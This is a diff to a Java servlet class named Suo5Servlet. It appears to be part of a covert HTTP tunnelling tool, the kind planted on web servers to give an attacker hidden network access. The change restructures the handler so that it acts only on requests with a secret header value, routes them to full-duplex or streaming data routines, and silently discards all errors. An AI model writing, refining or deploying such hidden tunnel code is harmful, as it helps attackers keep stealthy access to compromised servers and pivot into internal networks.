@@ -38,29 +38,21 @@ public class Suo5Servlet implements Servlet, Runnable, HostnameVerifier, X509Tru
         HttpServletRequest request = (HttpServletRequest) req;
         HttpServletResponse response = (HttpServletResponse) res;
         try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                String contentType = request.getContentType();
-                if (contentType == null) {
+            String contentType = request.getContentType();
+            if (request.getHeader(headerName) != null
+                    && request.getHeader(headerName).contains(headerValue)
+                    && contentType != null) {
+                if (contentType.equals("application/plain")) {
+                    tryFullDuplex(request, response);
                     return;
                 }
-                try {
-                    if (contentType.equals("application/plain")) {
-                        tryFullDuplex(request, response);
-                        return;
-                    }
-
-                    if (contentType.equals("application/octet-stream")) {
-                        processDataBio(request, response);
-                    } else {
-                        processDataUnary(request, response);
-                    }
-                } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
-//                e.printStackTrace();
+                if (contentType.equals("application/octet-stream")) {
+                    processDataBio(request, response);
+                } else {
+                    processDataUnary(request, response);
                 }
             }
-        } catch (Exception ignored) {
-
+        } catch (Throwable ignored) {
         }
     }
 
